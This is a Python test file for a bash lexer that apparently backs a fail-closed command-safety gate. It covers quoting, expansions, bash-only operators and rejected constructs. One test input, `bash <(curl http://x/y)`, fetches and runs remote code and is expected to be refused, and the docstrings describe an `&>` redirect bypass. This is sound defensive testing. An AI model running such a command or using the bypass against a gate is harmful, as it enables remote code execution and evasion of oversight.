"""Lexer tests.

Organised around the test obligations in `compiler/grammar.md` section 5. Where a test asserts
a bash behaviour, the expected value was verified against bash 5.3.15 rather than assumed, and
the test says so. Nothing here executes a shell.
"""

from __future__ import annotations

import pytest
from hypothesis import given, settings
from hypothesis import strategies as st

from compiler.lexer import tokenize
from compiler.syntax import Diag, LexError, PartKind, TokenKind


def kinds(src: str) -> list[TokenKind]:
    return [t.kind for t in tokenize(src)]


def words(src: str) -> list[str | None]:
    """The statically known value of every WORD token, with None for unknown."""
    return [t.word.value for t in tokenize(src) if t.kind is TokenKind.WORD and t.word]


def raises(src: str) -> Diag:
    with pytest.raises(LexError) as excinfo:
        tokenize(src)
    return excinfo.value.code


# --------------------------------------------------------------------- the ten rules


def test_rule1_end_of_input_delimits():
    assert kinds("ls") == [TokenKind.WORD, TokenKind.EOF]


def test_rule2_and_3_operators_extend_then_delimit():
    assert kinds("a && b") == [TokenKind.WORD, TokenKind.AND_IF, TokenKind.WORD, TokenKind.EOF]
    assert kinds("a &b") == [TokenKind.WORD, TokenKind.AMP, TokenKind.WORD, TokenKind.EOF]


def test_rule4_quoted_text_does_not_delimit():
    assert words("echo 'a b'") == ["echo", "a b"]
    assert words('echo "a b"') == ["echo", "a b"]


def test_rule4_beats_rule6_quoted_operator_is_text():
    # The classic false positive: a regex sees a redirect, the lexer sees an argument.
    assert kinds("grep '2>&1' file") == [
        TokenKind.WORD,
        TokenKind.WORD,
        TokenKind.WORD,
        TokenKind.EOF,
    ]
    assert words("grep '2>&1' file") == ["grep", "2>&1", "file"]


def test_rule5_expansion_is_read_to_its_end():
    toks = tokenize("echo $(ls)")
    assert len(toks) == 3
    assert toks[1].word is not None
    assert toks[1].word.has_kind(PartKind.CMD_SUBST)


def test_rule5_nested_substitution_records_depth():
    toks = tokenize("echo $(echo $(whoami))")
    part = next(p for p in toks[1].word.parts if p.kind is PartKind.CMD_SUBST)
    assert part.depth == 2


def test_rule5_closing_paren_inside_quotes_does_not_end_substitution():
    # Counting parentheses is not enough; this is why the scanner respects quoting.
    toks = tokenize('echo $(echo ")")')
    assert len(toks) == 3  # echo, the substitution, EOF
    part = next(p for p in toks[1].word.parts if p.kind is PartKind.CMD_SUBST)
    assert part.raw == '$(echo ")")'


def test_rule7_blanks_are_discarded():
    assert words("  ls   -la  ") == ["ls", "-la"]


def test_rule8_beats_rule9_hash_inside_a_word_is_not_a_comment():
    assert words("echo a#b") == ["echo", "a#b"]


def test_rule9_comment_runs_to_newline():
    assert words("ls # this is ignored") == ["ls"]
    assert words("ls # ignored\nwc") == ["ls", "wc"]


def test_rule9_quoted_hash_is_text():
    assert words("echo '#notacomment'") == ["echo", "#notacomment"]


# --------------------------------------------------------------------- quoting


def test_backslash_escapes_a_space_into_one_word():
    assert words("echo a\\ b") == ["echo", "a b"]


def test_escaped_newline_does_not_split_a_command():
    assert words("echo \\\nhello") == ["echo", "hello"]


def test_double_quote_backslash_only_escapes_five_characters():
    # Verified on bash 5.3.15: "\a" stays two characters, while "\$" is one.
    assert words('echo "\\a"') == ["echo", "\\a"]
    assert words('echo "\\$"') == ["echo", "$"]
    assert words('echo "\\\\"') == ["echo", "\\"]


def test_ansi_c_quoting_decodes_escapes():
    assert words("echo $'\\x41'") == ["echo", "A"]
    assert words("echo $'a\\tb'") == ["echo", "a\tb"]
    assert words("echo $'\\101'") == ["echo", "A"]  # octal
    assert words("echo $'\\u0041'") == ["echo", "A"]


def test_ansi_c_quoting_refuses_a_decoded_nul():
    # bash truncates the word at the NUL; silence is not acceptable here.
    assert raises("echo $'a\\x00b'") is Diag.DECODED_NUL


def test_ansi_c_backslash_eight_is_literal_and_terminates():
    # Regression, twice over: `\8` is not an octal escape so it must not stall the scanner,
    # and bash keeps the backslash on an unrecognised escape. Checked against bash 5.3.15.
    assert words("echo $'\\8'") == ["echo", "\\8"]


def test_unterminated_quotes_are_named():
    assert raises("echo 'abc") is Diag.UNTERMINATED_SQUOTE
    assert raises('echo "abc') is Diag.UNTERMINATED_DQUOTE
    assert raises("echo $'abc") is Diag.UNTERMINATED_ANSI_C_QUOTE
    assert raises("echo $(ls") is Diag.UNTERMINATED_EXPANSION
    assert raises("echo \\") is Diag.TRAILING_BACKSLASH


# --------------------------------------------------------------------- known vs unknown


def test_a_literal_word_is_known():
    toks = tokenize("rm -rf build")
    assert all(t.word.is_known for t in toks if t.kind is TokenKind.WORD)


def test_glob_makes_a_word_unknown():
    toks = tokenize("rm *")
    star = toks[1].word
    assert not star.is_known
    assert star.has_kind(PartKind.GLOB)


def test_variable_makes_a_word_unknown():
    assert words("cat $HOME/x") == ["cat", None]


def test_command_substitution_makes_a_word_unknown():
    assert words("rm $(cat list)") == ["rm", None]


def test_bracket_glob_detected_only_when_it_closes():
    # `[ -f x ]` is the test builtin: a lone `[` must stay literal, or every shell conditional
    # becomes unresolvable for no reason.
    assert words("[ -f x ]") == ["[", "-f", "x", "]"]
    toks = tokenize("ls [ab].py")
    assert toks[1].word.has_kind(PartKind.GLOB)


def test_brace_expansion_is_unknown_but_a_plain_brace_is_not():
    toks = tokenize("echo {a,b}")
    assert toks[1].word.has_kind(PartKind.BRACE_EXP)
    assert words("echo {a}") == ["echo", "{a}"]


def test_parameter_expansion_operator_forms_are_unknown():
    for src in ("echo ${x:=v}", "echo ${#x}", "echo ${!x}", "echo ${x//a/b}"):
        toks = tokenize(src)
        assert not toks[1].word.is_known, src


def test_special_parameters_are_unknown():
    for src in ("echo $?", "echo $$", "echo $@"):
        assert not tokenize(src)[1].word.is_known, src


def test_arithmetic_expansion_is_unknown():
    # Arithmetic evaluates variable contents recursively, so it can run a command.
    toks = tokenize("echo $((x))")
    assert toks[1].word.has_kind(PartKind.ARITH_EXP)
    assert not toks[1].word.is_known


def test_tilde_at_word_start_and_after_equals():
    # Verified on bash 5.3.15: `echo a=~` prints a=<home>, so the tilde after `=` expands.
    assert tokenize("cd ~")[1].word.has_kind(PartKind.TILDE)
    assert tokenize("echo a=~")[1].word.has_kind(PartKind.TILDE)
    # Mid-word, a tilde is an ordinary character.
    assert words("echo a~b") == ["echo", "a~b"]


# --------------------------------------------------------------------- classification hints


def test_io_number_versus_an_ordinary_word():
    assert kinds("2>file") == [TokenKind.IO_NUMBER, TokenKind.GT, TokenKind.WORD, TokenKind.EOF]
    assert kinds("echo 2 > file") == [
        TokenKind.WORD,
        TokenKind.WORD,
        TokenKind.GT,
        TokenKind.WORD,
        TokenKind.EOF,
    ]


def test_assignment_hint_follows_rule_7():
    assert tokenize("A=1 cmd")[0].assignment_name == "A"
    assert tokenize("PATH=$HOME/bin cmd")[0].assignment_name == "PATH"
    assert tokenize("=1 cmd")[0].assignment_name is None
    assert tokenize("=1 cmd")[0].metadata.get("bad_assignment") is None
    # Unspecified in POSIX, rejected by us: the parser refuses on this flag in a prefix.
    assert tokenize("a-b=c cmd")[0].metadata.get("bad_assignment") == "1"


def test_an_ordinary_word_with_an_expansion_is_not_flagged_as_an_assignment():
    # Regression: this must not look like a malformed assignment.
    token = tokenize("ls $HOME/bin")[1]
    assert token.assignment_name is None
    assert token.metadata.get("bad_assignment") is None


def test_reserved_word_hint_is_defeated_by_quoting():
    assert tokenize("if")[0].could_be_reserved is True
    assert tokenize('"if"')[0].could_be_reserved is False
    assert tokenize("i\\f")[0].could_be_reserved is False


# --------------------------------------------------------------------- bash-only operators


@pytest.mark.parametrize(
    ("src", "kind"),
    [
        ("ls &>f", TokenKind.AND_GREAT),
        ("ls &>>f", TokenKind.AND_DGREAT),
        ("a |& b", TokenKind.PIPE_AND),
        ("cat <<<word", TokenKind.TRIPLE_LESS),
        ("case x in y) ;;& esac", TokenKind.DSEMI_AND),
    ],
)
def test_bash_only_operators_get_their_own_token(src: str, kind: TokenKind):
    """These must not be mis-tokenized into POSIX pieces.

    `&>f` read as AMP then GT is how a POSIX-only lexer sees it, and we verified on bash
    5.3.15 that bash instead sends both streams to the file. That difference is a bypass, so
    the operator gets its own token and the parser rejects it by name.
    """
    assert kind in kinds(src)


def test_and_great_is_not_two_tokens():
    assert TokenKind.AMP not in kinds("ls &>f")


# --------------------------------------------------------------------- rejected constructs


def test_process_substitution_is_named():
    assert raises("bash <(curl http://x/y)") is Diag.PROCESS_SUBSTITUTION
    assert raises("tee >(cat)") is Diag.PROCESS_SUBSTITUTION


def test_backquotes_are_named():
    assert raises("echo `ls`") is Diag.BACKQUOTE_SUBSTITUTION


def test_io_location_redirect_is_named():
    assert raises("{fd}<file") is Diag.IO_LOCATION_REDIRECT


def test_control_bytes_are_refused():
    assert raises("ls \r") is Diag.ILLEGAL_CONTROL_BYTE
    assert raises("ls \x00") is Diag.ILLEGAL_CONTROL_BYTE


def test_input_length_and_nesting_limits():
    assert raises("x" * 70000) is Diag.INPUT_TOO_LONG
    assert raises("echo " + "$(" * 40 + ")" * 40) is Diag.NESTING_TOO_DEEP


def test_non_ascii_is_allowed_inside_a_word():
    assert words("echo café") == ["echo", "café"]


# --------------------------------------------------------------------- here-documents


def test_heredoc_with_a_quoted_delimiter_is_captured_literally():
    src = "cat <<'EOF'\nhello $HOME\nEOF\n"
    toks = tokenize(src)
    dless = next(t for t in toks if t.kind is TokenKind.DLESS)
    assert dless.heredoc is not None
    assert dless.heredoc.value == "hello $HOME\n"


def test_heredoc_dash_strips_leading_tabs():
    src = "cat <<-'EOF'\n\tindented\n\tEOF\n"
    dless = next(t for t in tokenize(src) if t.kind is TokenKind.DLESSDASH)
    assert dless.heredoc.value == "indented\n"


def test_heredoc_with_an_unquoted_delimiter_is_refused():
    # Its body would be expanded, so its content is not statically known.
    assert raises("cat <<EOF\nx\nEOF\n") is Diag.HEREDOC_UNQUOTED_DELIMITER


def test_unterminated_heredoc_is_named():
    assert raises("cat <<'EOF'\nno terminator here\n") is Diag.UNTERMINATED_HEREDOC


# --------------------------------------------------------------------- fail closed


@settings(max_examples=400, deadline=None)
@given(st.text(max_size=120))
def test_only_lex_error_ever_escapes(src: str):
    """The property the gate depends on: for arbitrary input, the lexer either returns tokens
    or raises LexError. Any other exception would mean the gate cannot fail closed."""
    try:
        tokenize(src)
    except LexError:
        pass


@settings(max_examples=200, deadline=None)
@given(st.text(alphabet="abc '\"\\$(){}<>&|;*?~=#\n\t", max_size=40))
def test_fail_closed_on_shell_metacharacter_soup(src: str):
    """The same property, biased towards the characters that actually drive the lexer."""
    try:
        tokenize(src)
    except LexError:
        pass
